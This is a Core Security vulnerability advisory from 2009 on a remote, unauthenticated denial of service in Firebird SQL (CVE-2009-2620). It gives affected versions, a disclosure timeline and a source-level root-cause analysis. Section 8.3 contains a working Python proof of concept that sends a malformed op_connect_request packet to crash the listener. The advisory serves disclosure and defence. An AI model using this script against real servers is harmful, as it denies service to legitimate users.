@@ -1,0 +1,432 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+      Core Security Technologies - CoreLabs Advisory
+           http://www.coresecurity.com/corelabs/
+
+Firebird SQL op_connect_request main listener shutdown vulnerability
+
+
+1. *Advisory Information*
+
+Title: Firebird SQL op_connect_request main listener shutdown vulnerability
+Advisory ID: CORE-2009-0707
+Advisory URL: http://www.coresecurity.com/content/firebird-sql-dos
+Date published: 2009-07-28
+Date of last update: 2009-07-28
+Vendors contacted: Firebird SQL
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Denial of service (DoS)
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: 35842
+CVE Name: CVE-2009-2620
+
+
+3. *Vulnerability Description*
+
+Firebird SQL [1] is an open source relational database management system
+offering many ANSI SQL standard features that runs on Linux, Windows,
+and a variety of Unix platforms.
+
+A remote denial of service vulnerability has been found in Firebird SQL,
+which can be exploited by a remote attacker to force the server to close
+the socket where it is listening for incoming connections and to enter
+an infinite loop, by sending an unexpected 'op_connect_request' message
+with invalid data to the server.
+
+
+4. *Vulnerable packages*
+
+   . Firebird SQL v1.5.5
+   . Firebird SQL v2.0.1
+   . Firebird SQL v2.0.5
+   . Firebird SQL v2.1.1
+   . Firebird SQL v2.1.2
+   . Firebird SQL v2.1.3 RC1
+   . Firebird SQL v2.5.0 Beta 1
+
+
+5. *Non-vulnerable packages*
+
+   . Firebird SQL v2.1.3 Release Candidate 2 (estimated release: July 2009)
+   . Firebird SQL v2.5 Beta 2 (estimated release: July 2009)
+   . Firebird SQL v1.5.6 (estimated release: August 2009)
+   . Firebird SQL v2.0.6 (estimated release: October 2009)
+
+Please build a fresh CVS checkout to have a fixed version sooner.
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+The issue is resolved in all branches of the Firebird SQL repository. It
+is registered in the Firebird SQL bug tracker as:
+http://tracker.firebirdsql.org/browse/CORE-2563
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon
+from Core Security Technologies.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+
+8.1. *Introduction*
+
+Firebird SQL is an open source relational database management system
+offering many ANSI SQL standard features that runs on Linux, Windows and
+a variety of Unix platforms.
+
+A remote denial of service can be triggered by an unauthenticated
+attacker, by sending an unexpected 'op_connect_request' message with
+invalid data of length greater than or equal to 12 bytes to the server.
+
+Inside the server ('src/remote/server.cpp'), the function
+'process_packet2()' processes a packet received from a client. This
+function has a 'switch' statement that considers all the possible
+opcodes defined in the protocol (see 'P_OP' enum 'in
+src/remote/protocol.h').
+
+/-----------
+
+src/remote/server.cpp:
+
+...
+3404	P_OP op = receive->p_operation;
+3405	switch (op)
+3406	{
+3407	case op_connect:
+	...
+3426	case op_compile:
+	...
+3430	case op_attach:
+	...
+
+- -----------/
+
+ In the case of an 'op_connect_request' packet, the execution flow goes
+to the following 'case' in the 'switch' statement:
+
+/-----------
+
+src/remote/server.cpp:
+
+...
+3584	case op_connect_request:
+3585		aux_request(port, &receive->p_req, sendL);
+3586		break;
+
+- -----------/
+
+ After calling 'aux_request()' function and executing the 'break'
+statement, execution lands here:
+
+/-----------
+
+src/remote/server.cpp:
+
+...
+3652	if (port && port->port_state == state_broken) {
+3653		if (!port->port_parent) {
+3654			gds__log("SERVER/process_packet: broken port, server exiting");
+3655			port->disconnect(sendL, receive);
+3656			ThreadData::restoreSpecific();
+3657			return false;
+3658		}
+3659		port->disconnect(sendL, receive);
+3660		port = NULL;
+3661	}
+
+- -----------/
+
+ By debugging the 'fbserver.exe' binary when it receives an
+'op_connect_request' packet, we can see that the conditions of the first
+'if' statement are satisfied, but the condition of the second 'if' is
+not, so execution flow goes to the 'port->disconnect()' call:
+
+/-----------
+
+005ACE2C  |>  837E 0C 03           CMP DWORD PTR DS:[ESI+C],3
+    ;port->port_state == state_broken ?
+005ACE30  |.  75 1B                JNZ SHORT fbserver.005ACE4D
+005ACE32  |.  837E 1C 00           CMP DWORD PTR DS:[ESI+1C],0
+    ;port->port_parent == 0?
+005ACE36  |.  75 0A                JNZ SHORT fbserver.005ACE42
+    ;this conditional jump is taken
+005ACE38  |.  68 D4D65F00          PUSH fbserver.005FD6D4
+    ;  ASCII "SERVER/process_packet: broken port, server exiting"
+005ACE3D  |.^ E9 44FDFFFF          JMP fbserver.005ACB86
+005ACE42  |>  53                   PUSH EBX
+    ; /Arg2
+005ACE43  |.  57                   PUSH EDI
+    ; |Arg1
+005ACE44  |.  8BCE                 MOV ECX,ESI
+    ; |
+005ACE46  |.  E8 65D7FFFF          CALL <fbserver.rem_port::disconnect>
+    ; \port->disconnect(sendL, receive)
+
+- -----------/
+
+ The type of 'port' is 'struct rem_port', as defined in
+'src/remote/remote.h'. This struct type has a 'disconnect()' function
+that is implemented in 'src/remote/server.cpp':
+
+/-----------
+
+src/remote/server.cpp:
+
+1464	void rem_port::disconnect(PACKET* sendL, PACKET* receiveL)
+
+- -----------/
+
+ Inside this function, the following code is executed, in order to free
+both the sent and received packets and to close the corresponding sockets:
+
+/-----------
+
+src/remote/server.cpp:
+
+...
+1492	REMOTE_free_packet(this, sendL);
+1493	REMOTE_free_packet(this, receiveL);
+1494	this->disconnect();
+
+- -----------/
+
+ That call to 'this->disconnect()' will ultimately lead to the
+'disconnect()' function in 'src/remote/inet.cpp'. This function is
+intended to break a remote connection, and receives a 'rem_port'
+structure as parameter.
+
+/-----------
+
+src/remote/inet.cpp:
+
+1731	static void disconnect( rem_port* port)
+1732	{
+
+- -----------/
+
+ In the first place, the function closes the connection established by
+the client, by calling the 'shutdown' function:
+
+/-----------
+
+src/remote/inet.cpp:
+
+...
+1763	if (port->port_handle && (SOCKET) port->port_handle !=
+INVALID_SOCKET) {
+1764		shutdown((int) port->port_handle, 2);
+1765	}
+
+- -----------/
+
+ After that, as a comment line states, if the current 'rem_port'
+structure being disconnected is a child of another 'rem_port' structure,
+it recursively calls 'disconnect()' to disconnect the 'rem_port' stored
+at 'port->port_async'. 'port_async' is a member of 'rem_port' struct
+that describes an asynchronous sibling port.
+
+/-----------
+
+src/remote/inet.cpp:
+
+/* If this is a sub-port, unlink it from it's parent */
+...
+1789	rem_port* parent = port->port_parent;
+1790	if (parent != NULL) {
+1791		if (port->port_async) {
+1792			disconnect(port->port_async);
+1793			port->port_async = NULL;
+1794		}
+
+- -----------/
+
+ But when that recursive call to 'disconnect()' is made, the
+'port->port_async' passed as parameter to be disconnected corresponds to
+the main server socket, that is, the socket listening for incoming
+connections on port 3050/TCP. Once in the recursive call, 'shutdown()'
+and 'closesocket()' functions are invoked, making the server to stop
+listening on the default port 3050/TCP, thus denying the service to
+legitimate users.
+
+
+8.2. *Remarks*
+
+As a side effect, the 'fbserver.exe' process will enter an infinite
+loop, consuming 100% CPU time.
+
+On Windows platform, in a default installation, Firebird SQL server is
+installed as a Windows service, and another service (the Firebird
+Guardian) runs together with the server, in order to automatically
+restart the 'fbserver.exe' process if it crashes or stops running
+abnormally. However, in this case the Firebird Guardian is unable to
+detect the denial of service condition, because the server does not
+crash nor stops running.
+
+In Firebird SQL 1.5.5 the behavior is different; the server will crash
+inside the 'aux_request()' function in 'src/remote/server.cpp' due to a
+null pointer dereference, instead of silently shutting down its listener
+port. The problem arises when 'port->port_context' (which has a 'NULL'
+value at this point) is loaded into 'rdb' variable and then, at line
+'885', it is used as a pointer without properly checking that it points
+to a valid memory address:
+
+/-----------
+
+src/remote/server.cpp:
+
+...
+884		rdb = port->port_context;
+885		port->send_response(send, rdb->rdb_id,
+886				send->p_resp.p_resp_data.cstr_length, status_vector);
+
+- -----------/
+
+
+
+
+8.3. *Proof of concept*
+
+The following Python script will trigger the denial of service condition
+on Firebird SQL, by sending an 'op_connect_request' packet with invalid
+data of length greater than or equal to 12 bytes.
+
+
+/-----------
+
+import socket
+import time
+
+def attack(host, port):
+    op_connect_request = '\x35'     # Request to establish connection
+
+    packet  = '\x00\x00\x00' + op_connect_request
+    packet += "A" * 12              #Invalid data, must be >= 12 bytes
+in order to trigger the DoS
+
+    print "(+) Connecting to the server...."
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    print "(+) Sending op_connect_request packet..."
+    s.send(str(packet))
+    s.close()
+    print "(+) op_connect_request packet successfully sent."
+
+    #Wait 10 seconds and try to connect again to Firebird SQL server, to
+check if it's down
+    print "(+) Waiting 10 seconds before trying to reconnect to the
+server..."
+    time.sleep(10)
+
+    try:
+        print "(+) Trying to reconnect..."
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        s.close()
+        print "(!) Something went wrong. The server is still alive."
+    except socket.error:
+        print "(*) Attack successful. The server is down."
+
+
+port = 3050
+host = '192.168.131.128'            #Replace with your target host
+attack(host, port)
+
+- -----------/
+
+
+
+9. *Report Timeline*
+
+. 2009-07-15:
+Core Security Technologies notifies the Firebird team of the vulnerability.
+
+. 2009-07-16:
+Firebird team requests technical details in plaintext.
+
+. 2009-07-16:
+Core sends the advisory draft, including technical details.
+
+. 2009-07-20:
+Firebird team notifies that the issue is resolved in all branches of the
+Firebird repository [2]. Technical details will be publicly visible when
+Core releases its advisory. Firebird team notices that Firebird version
+1.5.5 (marked as non vulnerable in the advisory draft) seems to be
+affected.
+
+. 2009-07-27:
+Core sends the final version of the advisory to the Firebird team.
+
+. 2009-07-28:
+The advisory CORE-2009-0707 is published.
+
+
+
+10. *References*
+
+[1] http://www.firebirdsql.org
+[2] http://tracker.firebirdsql.org/browse/CORE-2563
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://www.coresecurity.com/corelabs.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources are
+exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and software
+security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
+Security Technologies can be reached at 617-399-6980 or on the Web at
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2009 Core Security
+Technologies and (c) 2009 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper credit
+is given.
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (MingW32)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iEYEARECAAYFAkpvTl0ACgkQyNibggitWa17uQCeMYg7kPSMqmAB1vDNn7Q7xzel
+0BYAoJLL6358DsIP9wuSZDxTH3DiUp7Z
+=GgTL
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2009-07-28]
